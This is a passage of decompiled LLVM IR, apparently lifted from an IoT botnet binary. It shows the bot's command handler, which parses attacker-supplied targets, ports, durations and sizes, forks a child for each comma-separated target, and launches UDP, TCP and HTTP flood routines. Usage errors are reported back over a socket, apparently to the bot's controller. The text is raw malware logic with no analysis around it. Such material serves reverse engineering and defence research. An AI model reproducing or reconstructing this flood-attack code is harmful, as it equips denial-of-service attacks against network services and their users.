  %v2_1000a434 = load i32, i32* %v1_1000a434, align 4
  store i32 268477504, i32* @lr, align 4
  %v2_1000a43c = call i32 @atol(i32 %v2_1000a434, i32 %v1_1000a430)
  %v2_1000a444 = icmp sgt i32 %v2_1000a43c, 0
  br i1 %v2_1000a444, label %dec_label_pc_1000a46c, label %dec_label_pc_1000a44c

dec_label_pc_1000a44c:                            ; preds = %dec_label_pc_1000a42c, %dec_label_pc_1000a400, %dec_label_pc_1000a3d8, %dec_label_pc_1000a3b4, %dec_label_pc_1000a390, %dec_label_pc_1000a36c, %dec_label_pc_1000a348, %dec_label_pc_1000a324, %dec_label_pc_1000a318
  %v3_1000a450 = load i32, i32* @global_var_100285b0.29, align 4
  store i32 ptrtoint (i32* @global_var_1000a468.510 to i32), i32* @lr, align 4
  %v4_1000a464 = call i32 @sockprintf(i32 %v3_1000a450, i32 ptrtoint ([113 x i8]* @global_var_10016300.509 to i32), i32 268500992)
  br label %dec_label_pc_1000aea0

dec_label_pc_1000a46c:                            ; preds = %dec_label_pc_1000a420, %dec_label_pc_1000a42c
  %v1_1000a470 = add i32 %tmp, 4
  %v1_1000a474 = inttoptr i32 %v1_1000a470 to i32*
  %v2_1000a474 = load i32, i32* %v1_1000a474, align 4
  %v2_1000a484 = load i32, i32* %v1_1000a350, align 4
  store i32 268477584, i32* @lr, align 4
  %v2_1000a48c = call i32 @atol(i32 %v2_1000a484, i32 %v1_1000a34c)
  %v2_1000a4a0 = load i32, i32* %v1_1000a32c, align 4
  store i32 268477612, i32* @lr, align 4
  %v2_1000a4a8 = call i32 @atol(i32 %v2_1000a4a0, i32 %v1_1000a328)
  %v2_1000a4bc = load i32, i32* %v1_1000a374, align 4
  store i32 268477640, i32* @lr, align 4
  %v2_1000a4c4 = call i32 @atol(i32 %v2_1000a4bc, i32 %v1_1000a370)
  %v2_1000a4d8 = load i32, i32* %v1_1000a398, align 4
  store i32 268477668, i32* @lr, align 4
  %v2_1000a4e0 = call i32 @atol(i32 %v2_1000a4d8, i32 %v1_1000a394)
  br i1 %v1_1000a424, label %dec_label_pc_1000a51c.thread, label %dec_label_pc_1000a51c

dec_label_pc_1000a51c.thread:                     ; preds = %dec_label_pc_1000a46c
  br label %dec_label_pc_1000a54c

dec_label_pc_1000a51c:                            ; preds = %dec_label_pc_1000a46c
  %v1_1000a4fc = add i32 %tmp, 24
  %v1_1000a500 = inttoptr i32 %v1_1000a4fc to i32*
  %v2_1000a500 = load i32, i32* %v1_1000a500, align 4
  store i32 268477708, i32* @lr, align 4
  %v2_1000a508 = call i32 @atol(i32 %v2_1000a500, i32 %v1_1000a4fc)
  br i1 %v3_1000a424, label %dec_label_pc_1000a54c, label %dec_label_pc_1000a530

dec_label_pc_1000a530:                            ; preds = %dec_label_pc_1000a51c
  %v1_1000a534 = add i32 %tmp, 28
  %v1_1000a538 = inttoptr i32 %v1_1000a534 to i32*
  %v2_1000a538 = load i32, i32* %v1_1000a538, align 4
  store i32 268477764, i32* @lr, align 4
  %v2_1000a540 = call i32 @atol(i32 %v2_1000a538, i32 %v1_1000a534)
  br label %dec_label_pc_1000a560

dec_label_pc_1000a54c:                            ; preds = %dec_label_pc_1000a51c.thread, %dec_label_pc_1000a51c
  %storemerge920 = phi i32 [ 1000, %dec_label_pc_1000a51c.thread ], [ %v2_1000a508, %dec_label_pc_1000a51c ]
  br label %dec_label_pc_1000a560

dec_label_pc_1000a560:                            ; preds = %dec_label_pc_1000a530, %dec_label_pc_1000a54c
  %storemerge919 = phi i32 [ %storemerge920, %dec_label_pc_1000a54c ], [ %v2_1000a508, %dec_label_pc_1000a530 ]
  %storemerge8 = phi i32 [ 1000000, %dec_label_pc_1000a54c ], [ %v2_1000a540, %dec_label_pc_1000a530 ]
  %tmp88 = icmp slt i32 %arg1, 9
  br i1 %tmp88, label %dec_label_pc_1000a590, label %dec_label_pc_1000a574

dec_label_pc_1000a574:                            ; preds = %dec_label_pc_1000a560
  %v1_1000a578 = add i32 %tmp, 32
  %v1_1000a57c = inttoptr i32 %v1_1000a578 to i32*
  %v2_1000a57c = load i32, i32* %v1_1000a57c, align 4
  store i32 268477832, i32* @lr, align 4
  %v2_1000a584 = call i32 @atol(i32 %v2_1000a57c, i32 %v1_1000a578)
  br label %dec_label_pc_1000a598

dec_label_pc_1000a590:                            ; preds = %dec_label_pc_1000a560
  br label %dec_label_pc_1000a598

dec_label_pc_1000a598:                            ; preds = %dec_label_pc_1000a574, %dec_label_pc_1000a590
  %storemerge7 = phi i32 [ 0, %dec_label_pc_1000a590 ], [ %v2_1000a584, %dec_label_pc_1000a574 ]
  store i32 %v2_1000a474, i32* @r3, align 4
  store i32 268477872, i32* @lr, align 4
  %v2_1000a5ac = call i32 @__GI_strchr(i32 %v2_1000a474, i32 44)
  %v3_1000a5b4 = icmp eq i32 %v2_1000a5ac, 0
  br i1 %v3_1000a5b4, label %dec_label_pc_1000a640, label %dec_label_pc_1000a5bc

dec_label_pc_1000a5bc:                            ; preds = %dec_label_pc_1000a598
  store i32 ptrtoint (i32* @global_var_10015f6c.365 to i32), i32* @r4, align 4
  store i32 268477904, i32* @lr, align 4
  %v3_1000a5cc = call i32 @__GI_strtok(i32 %v2_1000a474, i32 ptrtoint (i32* @global_var_10015f6c.365 to i32), i32 268500992)
  %v3_1000a63434 = icmp eq i32 %v3_1000a5cc, 0
  br i1 %v3_1000a63434, label %dec_label_pc_1000aea0, label %dec_label_pc_1000a5dc

dec_label_pc_1000a5dc:                            ; preds = %dec_label_pc_1000a5bc, %dec_label_pc_1000a618
  %storemerge1835 = phi i32 [ %v3_1000a624, %dec_label_pc_1000a618 ], [ %v3_1000a5cc, %dec_label_pc_1000a5bc ]
  store i32 268477920, i32* @lr, align 4
  %v0_1000a5dc = call i32 @listFork()
  %v3_1000a5e4 = icmp eq i32 %v0_1000a5dc, 0
  br i1 %v3_1000a5e4, label %dec_label_pc_1000a5ec, label %dec_label_pc_1000a618

dec_label_pc_1000a5ec:                            ; preds = %dec_label_pc_1000a5dc
  store i32 %storemerge7, i32* @r10, align 4
  %v7_1000a60c = call i32 @sendUDP(i32 %storemerge1835, i32 %v2_1000a48c, i32 %v2_1000a4a8, i32 %v2_1000a4c4, i32 %v2_1000a4e0, i32 %storemerge919, i32 %storemerge8)
  %v1_1000a614 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000a618

dec_label_pc_1000a618:                            ; preds = %dec_label_pc_1000a5dc, %dec_label_pc_1000a5ec
  store i32 ptrtoint (i32* @global_var_10015f6c.365 to i32), i32* @r4, align 4
  store i32 268477992, i32* @lr, align 4
  %v3_1000a624 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10015f6c.365 to i32), i32 268500992)
  %v3_1000a634 = icmp eq i32 %v3_1000a624, 0
  br i1 %v3_1000a634, label %dec_label_pc_1000aea0, label %dec_label_pc_1000a5dc

dec_label_pc_1000a640:                            ; preds = %dec_label_pc_1000a598
  store i32 268478020, i32* @lr, align 4
  %v0_1000a640 = call i32 @listFork()
  %v3_1000a648 = icmp eq i32 %v0_1000a640, 0
  br i1 %v3_1000a648, label %dec_label_pc_1000a650, label %dec_label_pc_1000aea0

dec_label_pc_1000a650:                            ; preds = %dec_label_pc_1000a640
  store i32 %storemerge7, i32* @r10, align 4
  %v7_1000a670 = call i32 @sendUDP(i32 %v2_1000a474, i32 %v2_1000a48c, i32 %v2_1000a4a8, i32 %v2_1000a4c4, i32 %v2_1000a4e0, i32 %storemerge919, i32 %storemerge8)
  %v1_1000a678 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000a67c

dec_label_pc_1000a67c:                            ; preds = %dec_label_pc_1000a2f4, %dec_label_pc_1000a650
  %v2_1000a680 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_10016374.514 to i32), i32* @r4, align 4
  %v3_1000a690 = inttoptr i32 %v2_1000a680 to i8*
  %v4_1000a690 = call i32 @__GI_strcoll(i8* %v3_1000a690, i32 ptrtoint ([4 x i8]* @global_var_10016374.514 to i32))
  %v3_1000a698 = icmp eq i32 %v4_1000a690, 0
  br i1 %v3_1000a698, label %dec_label_pc_1000a6a0, label %dec_label_pc_1000a968

dec_label_pc_1000a6a0:                            ; preds = %dec_label_pc_1000a67c
  %tmp89 = icmp slt i32 %arg1, 6
  br i1 %tmp89, label %dec_label_pc_1000a790, label %dec_label_pc_1000a6ac

dec_label_pc_1000a6ac:                            ; preds = %dec_label_pc_1000a6a0
  %v1_1000a6b0 = add i32 %tmp, 12
  %v1_1000a6b4 = inttoptr i32 %v1_1000a6b0 to i32*
  %v2_1000a6b4 = load i32, i32* %v1_1000a6b4, align 4
  store i32 268478144, i32* @lr, align 4
  %v2_1000a6bc = call i32 @atol(i32 %v2_1000a6b4, i32 %v1_1000a6b0)
  %v4_1000a6c8 = icmp eq i32 %v2_1000a6bc, -1
  br i1 %v4_1000a6c8, label %dec_label_pc_1000a790, label %dec_label_pc_1000a6d0

dec_label_pc_1000a6d0:                            ; preds = %dec_label_pc_1000a6ac
  %v1_1000a6d4 = add i32 %tmp, 8
  %v1_1000a6d8 = inttoptr i32 %v1_1000a6d4 to i32*
  %v2_1000a6d8 = load i32, i32* %v1_1000a6d8, align 4
  store i32 268478180, i32* @lr, align 4
  %v2_1000a6e0 = call i32 @atol(i32 %v2_1000a6d8, i32 %v1_1000a6d4)
  %v4_1000a6ec = icmp eq i32 %v2_1000a6e0, -1
  br i1 %v4_1000a6ec, label %dec_label_pc_1000a790, label %dec_label_pc_1000a6f4

dec_label_pc_1000a6f4:                            ; preds = %dec_label_pc_1000a6d0
  %v1_1000a6f8 = add i32 %tmp, 16
  %v1_1000a6fc = inttoptr i32 %v1_1000a6f8 to i32*
  %v2_1000a6fc = load i32, i32* %v1_1000a6fc, align 4
  store i32 268478216, i32* @lr, align 4
  %v2_1000a704 = call i32 @atol(i32 %v2_1000a6fc, i32 %v1_1000a6f8)
  %v4_1000a710 = icmp eq i32 %v2_1000a704, -1
  br i1 %v4_1000a710, label %dec_label_pc_1000a790, label %dec_label_pc_1000a718

dec_label_pc_1000a718:                            ; preds = %dec_label_pc_1000a6f4
  %v2_1000a720 = load i32, i32* %v1_1000a6fc, align 4
  store i32 268478252, i32* @lr, align 4
  %v2_1000a728 = call i32 @atol(i32 %v2_1000a720, i32 %v1_1000a6f8)
  %v2_1000a730 = icmp sgt i32 %v2_1000a728, 32
  br i1 %v2_1000a730, label %dec_label_pc_1000a790, label %dec_label_pc_1000a738

dec_label_pc_1000a738:                            ; preds = %dec_label_pc_1000a718
  %tmp90 = icmp slt i32 %arg1, 7
  br i1 %tmp90, label %dec_label_pc_1000a764, label %dec_label_pc_1000a744

dec_label_pc_1000a744:                            ; preds = %dec_label_pc_1000a738
  %v1_1000a748 = add i32 %tmp, 24
  %v1_1000a74c = inttoptr i32 %v1_1000a748 to i32*
  %v2_1000a74c = load i32, i32* %v1_1000a74c, align 4
  store i32 268478296, i32* @lr, align 4
  %v2_1000a754 = call i32 @atol(i32 %v2_1000a74c, i32 %v1_1000a748)
  %v1_1000a75c = icmp slt i32 %v2_1000a754, 0
  br i1 %v1_1000a75c, label %dec_label_pc_1000a790, label %dec_label_pc_1000a764

dec_label_pc_1000a764:                            ; preds = %dec_label_pc_1000a744, %dec_label_pc_1000a738
  %v3_1000a768 = icmp eq i32 %arg1, 8
  br i1 %v3_1000a768, label %dec_label_pc_1000a770, label %dec_label_pc_1000a7b0

dec_label_pc_1000a770:                            ; preds = %dec_label_pc_1000a764
  %v1_1000a774 = add i32 %tmp, 28
  %v1_1000a778 = inttoptr i32 %v1_1000a774 to i32*
  %v2_1000a778 = load i32, i32* %v1_1000a778, align 4
  store i32 268478340, i32* @lr, align 4
  %v2_1000a780 = call i32 @atol(i32 %v2_1000a778, i32 %v1_1000a774)
  %v2_1000a788 = icmp sgt i32 %v2_1000a780, 0
  br i1 %v2_1000a788, label %dec_label_pc_1000a7b0, label %dec_label_pc_1000a790

dec_label_pc_1000a790:                            ; preds = %dec_label_pc_1000a770, %dec_label_pc_1000a744, %dec_label_pc_1000a718, %dec_label_pc_1000a6f4, %dec_label_pc_1000a6d0, %dec_label_pc_1000a6ac, %dec_label_pc_1000a6a0
  %v3_1000a794 = load i32, i32* @global_var_100285b0.29, align 4
  store i32 ptrtoint (i32* @global_var_1000a7ac.516 to i32), i32* @lr, align 4
  %v4_1000a7a8 = call i32 @sockprintf(i32 %v3_1000a794, i32 ptrtoint ([186 x i8]* @global_var_10016378.515 to i32), i32 268500992)
  br label %dec_label_pc_1000aea0

dec_label_pc_1000a7b0:                            ; preds = %dec_label_pc_1000a764, %dec_label_pc_1000a770
  %v1_1000a7b4 = add i32 %tmp, 4
  %v1_1000a7b8 = inttoptr i32 %v1_1000a7b4 to i32*
  %v2_1000a7b8 = load i32, i32* %v1_1000a7b8, align 4
  %v2_1000a7c8 = load i32, i32* %v1_1000a6d8, align 4
  store i32 268478420, i32* @lr, align 4
  %v2_1000a7d0 = call i32 @atol(i32 %v2_1000a7c8, i32 %v1_1000a6d4)
  %v2_1000a7e4 = load i32, i32* %v1_1000a6b4, align 4
  store i32 268478448, i32* @lr, align 4
  %v2_1000a7ec = call i32 @atol(i32 %v2_1000a7e4, i32 %v1_1000a6b0)
  %v2_1000a800 = load i32, i32* %v1_1000a6fc, align 4
  store i32 268478476, i32* @lr, align 4
  %v2_1000a808 = call i32 @atol(i32 %v2_1000a800, i32 %v1_1000a6f8)
  %v1_1000a818 = add i32 %tmp, 20
  %v1_1000a81c = inttoptr i32 %v1_1000a818 to i32*
  %v2_1000a81c = load i32, i32* %v1_1000a81c, align 4
  br i1 %v3_1000a768, label %dec_label_pc_1000a830, label %dec_label_pc_1000a84c

dec_label_pc_1000a830:                            ; preds = %dec_label_pc_1000a7b0
  %v1_1000a834 = add i32 %tmp, 28
  %v1_1000a838 = inttoptr i32 %v1_1000a834 to i32*
  %v2_1000a838 = load i32, i32* %v1_1000a838, align 4
  store i32 268478532, i32* @lr, align 4
  %v2_1000a840 = call i32 @atol(i32 %v2_1000a838, i32 %v1_1000a834)
  br label %dec_label_pc_1000a854

dec_label_pc_1000a84c:                            ; preds = %dec_label_pc_1000a7b0
  br label %dec_label_pc_1000a854

dec_label_pc_1000a854:                            ; preds = %dec_label_pc_1000a830, %dec_label_pc_1000a84c
  %storemerge6 = phi i32 [ 10, %dec_label_pc_1000a84c ], [ %v2_1000a840, %dec_label_pc_1000a830 ]
  br i1 %tmp90, label %dec_label_pc_1000a884, label %dec_label_pc_1000a868

dec_label_pc_1000a868:                            ; preds = %dec_label_pc_1000a854
  %v1_1000a86c = add i32 %tmp, 24
  %v1_1000a870 = inttoptr i32 %v1_1000a86c to i32*
  %v2_1000a870 = load i32, i32* %v1_1000a870, align 4
  store i32 268478588, i32* @lr, align 4
  %v2_1000a878 = call i32 @atol(i32 %v2_1000a870, i32 %v1_1000a86c)
  br label %dec_label_pc_1000a88c

dec_label_pc_1000a884:                            ; preds = %dec_label_pc_1000a854
  br label %dec_label_pc_1000a88c

dec_label_pc_1000a88c:                            ; preds = %dec_label_pc_1000a868, %dec_label_pc_1000a884
  %storemerge5 = phi i32 [ 0, %dec_label_pc_1000a884 ], [ %v2_1000a878, %dec_label_pc_1000a868 ]
  store i32 %v2_1000a7b8, i32* @r3, align 4
  store i32 268478628, i32* @lr, align 4
  %v2_1000a8a0 = call i32 @__GI_strchr(i32 %v2_1000a7b8, i32 44)
  %v3_1000a8a8 = icmp eq i32 %v2_1000a8a0, 0
  br i1 %v3_1000a8a8, label %dec_label_pc_1000a930, label %dec_label_pc_1000a8b0

dec_label_pc_1000a8b0:                            ; preds = %dec_label_pc_1000a88c
  store i32 ptrtoint (i32* @global_var_10015f6c.365 to i32), i32* @r4, align 4
  store i32 268478660, i32* @lr, align 4
  %v3_1000a8c0 = call i32 @__GI_strtok(i32 %v2_1000a7b8, i32 ptrtoint (i32* @global_var_10015f6c.365 to i32), i32 268500992)
  %v3_1000a92430 = icmp eq i32 %v3_1000a8c0, 0
  br i1 %v3_1000a92430, label %dec_label_pc_1000a968, label %dec_label_pc_1000a8d0

dec_label_pc_1000a8d0:                            ; preds = %dec_label_pc_1000a8b0, %dec_label_pc_1000a908
  %storemerge1631 = phi i32 [ %v3_1000a914, %dec_label_pc_1000a908 ], [ %v3_1000a8c0, %dec_label_pc_1000a8b0 ]
  store i32 268478676, i32* @lr, align 4
  %v0_1000a8d0 = call i32 @listFork()
  %v3_1000a8d8 = icmp eq i32 %v0_1000a8d0, 0
  br i1 %v3_1000a8d8, label %dec_label_pc_1000a8e0, label %dec_label_pc_1000a908

dec_label_pc_1000a8e0:                            ; preds = %dec_label_pc_1000a8d0
  %v7_1000a8fc = call i32 @sendTCP(i32 %storemerge1631, i32 %v2_1000a7d0, i32 %v2_1000a7ec, i32 %v2_1000a808, i32 %v2_1000a81c, i32 %storemerge5, i32 %storemerge6)
  %v1_1000a904 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000a908

dec_label_pc_1000a908:                            ; preds = %dec_label_pc_1000a8d0, %dec_label_pc_1000a8e0
  store i32 ptrtoint (i32* @global_var_10015f6c.365 to i32), i32* @r4, align 4
  store i32 268478744, i32* @lr, align 4
  %v3_1000a914 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10015f6c.365 to i32), i32 268500992)
  %v3_1000a924 = icmp eq i32 %v3_1000a914, 0
  br i1 %v3_1000a924, label %dec_label_pc_1000a968, label %dec_label_pc_1000a8d0

dec_label_pc_1000a930:                            ; preds = %dec_label_pc_1000a88c
  store i32 268478772, i32* @lr, align 4
  %v0_1000a930 = call i32 @listFork()
  %v3_1000a938 = icmp eq i32 %v0_1000a930, 0
  br i1 %v3_1000a938, label %dec_label_pc_1000a940, label %dec_label_pc_1000a968

dec_label_pc_1000a940:                            ; preds = %dec_label_pc_1000a930
  %v7_1000a95c = call i32 @sendTCP(i32 %v2_1000a7b8, i32 %v2_1000a7d0, i32 %v2_1000a7ec, i32 %v2_1000a808, i32 %v2_1000a81c, i32 %storemerge5, i32 %storemerge6)
  %v1_1000a964 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000a968

dec_label_pc_1000a968:                            ; preds = %dec_label_pc_1000a908, %dec_label_pc_1000a8b0, %dec_label_pc_1000a930, %dec_label_pc_1000a67c, %dec_label_pc_1000a940
  %v2_1000a96c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_10016434.520 to i32), i32* @r4, align 4
  %v3_1000a97c = inttoptr i32 %v2_1000a96c to i8*
  %v4_1000a97c = call i32 @__GI_strcoll(i8* %v3_1000a97c, i32 ptrtoint ([5 x i8]* @global_var_10016434.520 to i32))
  %v3_1000a984 = icmp eq i32 %v4_1000a97c, 0
  br i1 %v3_1000a984, label %dec_label_pc_1000a98c, label %dec_label_pc_1000ab6c

dec_label_pc_1000a98c:                            ; preds = %dec_label_pc_1000a968
  %tmp91 = icmp slt i32 %arg1, 6
  br i1 %tmp91, label %dec_label_pc_1000aea0, label %dec_label_pc_1000a998

dec_label_pc_1000a998:                            ; preds = %dec_label_pc_1000a98c
  %v1_1000a99c = add i32 %tmp, 4
  %v1_1000a9a0 = inttoptr i32 %v1_1000a99c to i32*
  %v2_1000a9a0 = load i32, i32* %v1_1000a9a0, align 4
  store i32 %v2_1000a9a0, i32* @r3, align 4
  store i32 268478896, i32* @lr, align 4
  %v2_1000a9ac = call i32 @__GI_strchr(i32 %v2_1000a9a0, i32 44)
  %v3_1000a9b4 = icmp eq i32 %v2_1000a9ac, 0
  br i1 %v3_1000a9b4, label %dec_label_pc_1000aabc, label %dec_label_pc_1000a9bc

dec_label_pc_1000a9bc:                            ; preds = %dec_label_pc_1000a998
  %v2_1000a9c4 = load i32, i32* %v1_1000a9a0, align 4
  store i32 ptrtoint (i32* @global_var_10015f6c.365 to i32), i32* @r4, align 4
  store i32 268478936, i32* @lr, align 4
  %v3_1000a9d4 = call i32 @__GI_strtok(i32 %v2_1000a9c4, i32 ptrtoint (i32* @global_var_10015f6c.365 to i32), i32 268500992)
  %v3_1000aab027 = icmp eq i32 %v3_1000a9d4, 0
  br i1 %v3_1000aab027, label %dec_label_pc_1000ab6c, label %dec_label_pc_1000a9e4.lr.ph

dec_label_pc_1000a9e4.lr.ph:                      ; preds = %dec_label_pc_1000a9bc
  %v1_1000aa18 = add i32 %tmp, 12
  %v1_1000aa1c = inttoptr i32 %v1_1000aa18 to i32*
  %v1_1000aa44 = add i32 %tmp, 20
  %v1_1000aa48 = inttoptr i32 %v1_1000aa44 to i32*
  %v1_1000aa5c = add i32 %tmp, 24
  %v1_1000aa60 = inttoptr i32 %v1_1000aa5c to i32*
  br label %dec_label_pc_1000a9e4

dec_label_pc_1000a9e4:                            ; preds = %dec_label_pc_1000a9e4.lr.ph, %dec_label_pc_1000aa94
  store i32 268478952, i32* @lr, align 4
  %v0_1000a9e4 = call i32 @listFork()
  %v3_1000a9ec = icmp eq i32 %v0_1000a9e4, 0
  br i1 %v3_1000a9ec, label %dec_label_pc_1000a9f4, label %dec_label_pc_1000aa94

dec_label_pc_1000a9f4:                            ; preds = %dec_label_pc_1000a9e4
  %v2_1000a9fc = load i32, i32* %v1_1000a9a0, align 4
  store i32 %v2_1000a9fc, i32* @r29, align 4
  %v2_1000aa1c = load i32, i32* %v1_1000aa1c, align 4
  store i32 268479016, i32* @lr, align 4
  %v2_1000aa24 = call i32 @atol(i32 %v2_1000aa1c, i32 %v1_1000aa18)
  %v1_1000aa2c = urem i32 %v2_1000aa24, 65536
  store i32 %v1_1000aa2c, i32* @r27, align 4
  %v2_1000aa48 = load i32, i32* %v1_1000aa48, align 4
  store i32 268479060, i32* @lr, align 4
  %v2_1000aa50 = call i32 @atol(i32 %v2_1000aa48, i32 %v1_1000aa44)
  %v2_1000aa60 = load i32, i32* %v1_1000aa60, align 4
  store i32 268479084, i32* @lr, align 4
  %v2_1000aa68 = call i32 @atol(i32 %v2_1000aa60, i32 %v1_1000aa5c)
  %v0_1000aa70 = load i32, i32* @r29, align 4
  %v0_1000aa74 = load i32, i32* @r28, align 4
  %v0_1000aa78 = load i32, i32* @r27, align 4
  %v0_1000aa7c = load i32, i32* @r26, align 4
  %v0_1000aa80 = load i32, i32* @r25, align 4
  %v6_1000aa88 = trunc i32 %v0_1000aa78 to i16
  %v7_1000aa88 = call i32 @sendHTTP(i32 %v0_1000aa70, i32 %v0_1000aa74, i16 %v6_1000aa88, i32 %v0_1000aa7c, i32 %v0_1000aa80, i32 %v2_1000aa68)
  %v1_1000aa90 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000aa94

dec_label_pc_1000aa94:                            ; preds = %dec_label_pc_1000a9e4, %dec_label_pc_1000a9f4
  store i32 ptrtoint (i32* @global_var_10015f6c.365 to i32), i32* @r4, align 4
  store i32 268479140, i32* @lr, align 4
  %v3_1000aaa0 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10015f6c.365 to i32), i32 268500992)
  %v3_1000aab0 = icmp eq i32 %v3_1000aaa0, 0
  br i1 %v3_1000aab0, label %dec_label_pc_1000ab6c, label %dec_label_pc_1000a9e4

dec_label_pc_1000aabc:                            ; preds = %dec_label_pc_1000a998
  store i32 268479168, i32* @lr, align 4
  %v0_1000aabc = call i32 @listFork()
  %v3_1000aac4 = icmp eq i32 %v0_1000aabc, 0
  br i1 %v3_1000aac4, label %dec_label_pc_1000aacc, label %dec_label_pc_1000aea0

dec_label_pc_1000aacc:                            ; preds = %dec_label_pc_1000aabc
  %v2_1000aad4 = load i32, i32* %v1_1000a9a0, align 4
  store i32 %v2_1000aad4, i32* @r29, align 4
  %v1_1000aaf0 = add i32 %tmp, 12
  %v1_1000aaf4 = inttoptr i32 %v1_1000aaf0 to i32*
  %v2_1000aaf4 = load i32, i32* %v1_1000aaf4, align 4
  store i32 268479232, i32* @lr, align 4
  %v2_1000aafc = call i32 @atol(i32 %v2_1000aaf4, i32 %v1_1000aaf0)
  %v1_1000ab04 = urem i32 %v2_1000aafc, 65536
  store i32 %v1_1000ab04, i32* @r27, align 4
  %v1_1000ab1c = add i32 %tmp, 20
  %v1_1000ab20 = inttoptr i32 %v1_1000ab1c to i32*
  %v2_1000ab20 = load i32, i32* %v1_1000ab20, align 4
  store i32 268479276, i32* @lr, align 4
  %v2_1000ab28 = call i32 @atol(i32 %v2_1000ab20, i32 %v1_1000ab1c)
  %v1_1000ab34 = add i32 %tmp, 24
  %v1_1000ab38 = inttoptr i32 %v1_1000ab34 to i32*
  %v2_1000ab38 = load i32, i32* %v1_1000ab38, align 4
  store i32 268479300, i32* @lr, align 4
  %v2_1000ab40 = call i32 @atol(i32 %v2_1000ab38, i32 %v1_1000ab34)
  %v0_1000ab48 = load i32, i32* @r29, align 4
  %v0_1000ab4c = load i32, i32* @r28, align 4
  %v0_1000ab50 = load i32, i32* @r27, align 4
  %v0_1000ab54 = load i32, i32* @r26, align 4
  %v0_1000ab58 = load i32, i32* @r25, align 4
  %v6_1000ab60 = trunc i32 %v0_1000ab50 to i16
  %v7_1000ab60 = call i32 @sendHTTP(i32 %v0_1000ab48, i32 %v0_1000ab4c, i16 %v6_1000ab60, i32 %v0_1000ab54, i32 %v0_1000ab58, i32 %v2_1000ab40)
  %v1_1000ab68 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000ab6c

dec_label_pc_1000ab6c:                            ; preds = %dec_label_pc_1000aa94, %dec_label_pc_1000a9bc, %dec_label_pc_1000a968, %dec_label_pc_1000aacc
  %v2_1000ab70 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1001643c.524 to i32), i32* @r4, align 4
  %v3_1000ab80 = inttoptr i32 %v2_1000ab70 to i8*
  %v4_1000ab80 = call i32 @__GI_strcoll(i8* %v3_1000ab80, i32 ptrtoint ([4 x i8]* @global_var_1001643c.524 to i32))
  %v3_1000ab88 = icmp eq i32 %v4_1000ab80, 0
  br i1 %v3_1000ab88, label %dec_label_pc_1000ab90, label %dec_label_pc_1000acf8

dec_label_pc_1000ab90:                            ; preds = %dec_label_pc_1000ab6c
  %tmp92 = icmp slt i32 %arg1, 4
  br i1 %tmp92, label %dec_label_pc_1000abdc, label %dec_label_pc_1000ab9c

dec_label_pc_1000ab9c:                            ; preds = %dec_label_pc_1000ab90
  %v1_1000aba0 = add i32 %tmp, 8
  %v1_1000aba4 = inttoptr i32 %v1_1000aba0 to i32*
  %v2_1000aba4 = load i32, i32* %v1_1000aba4, align 4
  store i32 268479408, i32* @lr, align 4
  %v2_1000abac = call i32 @atol(i32 %v2_1000aba4, i32 %v1_1000aba0)
  %tmp93 = icmp slt i32 %v2_1000abac, 1
  br i1 %tmp93, label %dec_label_pc_1000abdc, label %dec_label_pc_1000abbc

dec_label_pc_1000abbc:                            ; preds = %dec_label_pc_1000ab9c
  %v1_1000abc0 = add i32 %tmp, 12
  %v1_1000abc4 = inttoptr i32 %v1_1000abc0 to i32*
  %v2_1000abc4 = load i32, i32* %v1_1000abc4, align 4
  store i32 268479440, i32* @lr, align 4
  %v2_1000abcc = call i32 @atol(i32 %v2_1000abc4, i32 %v1_1000abc0)
  %v2_1000abd4 = icmp sgt i32 %v2_1000abcc, 0
  br i1 %v2_1000abd4, label %dec_label_pc_1000abfc, label %dec_label_pc_1000abdc

dec_label_pc_1000abdc:                            ; preds = %dec_label_pc_1000abbc, %dec_label_pc_1000ab9c, %dec_label_pc_1000ab90
  %v3_1000abe0 = load i32, i32* @global_var_100285b0.29, align 4
  store i32 ptrtoint (i32* @global_var_1000abf8.526 to i32), i32* @lr, align 4
  %v4_1000abf4 = call i32 @sockprintf(i32 %v3_1000abe0, i32 ptrtoint ([27 x i8]* @global_var_10016440.525 to i32), i32 268500992)
  br label %dec_label_pc_1000aea0

dec_label_pc_1000abfc:                            ; preds = %dec_label_pc_1000abbc
  %v1_1000ac00 = add i32 %tmp, 4
  %v1_1000ac04 = inttoptr i32 %v1_1000ac00 to i32*
  %v2_1000ac04 = load i32, i32* %v1_1000ac04, align 4
  %v2_1000ac14 = load i32, i32* %v1_1000aba4, align 4
  store i32 268479520, i32* @lr, align 4
  %v2_1000ac1c = call i32 @atol(i32 %v2_1000ac14, i32 %v1_1000aba0)
  %v2_1000ac30 = load i32, i32* %v1_1000abc4, align 4
  store i32 268479548, i32* @lr, align 4
  %v2_1000ac38 = call i32 @atol(i32 %v2_1000ac30, i32 %v1_1000abc0)
  store i32 %v2_1000ac04, i32* @r3, align 4
  store i32 268479572, i32* @lr, align 4
  %v2_1000ac50 = call i32 @__GI_strchr(i32 %v2_1000ac04, i32 44)
  %v3_1000ac58 = icmp eq i32 %v2_1000ac50, 0
  br i1 %v3_1000ac58, label %dec_label_pc_1000acd0, label %dec_label_pc_1000ac60

dec_label_pc_1000ac60:                            ; preds = %dec_label_pc_1000abfc
  store i32 ptrtoint (i32* @global_var_10015f6c.365 to i32), i32* @r4, align 4
  store i32 268479604, i32* @lr, align 4
  %v3_1000ac70 = call i32 @__GI_strtok(i32 %v2_1000ac04, i32 ptrtoint (i32* @global_var_10015f6c.365 to i32), i32 268500992)
  %v3_1000acc423 = icmp eq i32 %v3_1000ac70, 0
  br i1 %v3_1000acc423, label %dec_label_pc_1000acf8, label %dec_label_pc_1000ac80

dec_label_pc_1000ac80:                            ; preds = %dec_label_pc_1000ac60, %dec_label_pc_1000aca8
  %storemerge1224 = phi i32 [ %v3_1000acb4, %dec_label_pc_1000aca8 ], [ %v3_1000ac70, %dec_label_pc_1000ac60 ]
  store i32 268479620, i32* @lr, align 4
  %v0_1000ac80 = call i32 @listFork()
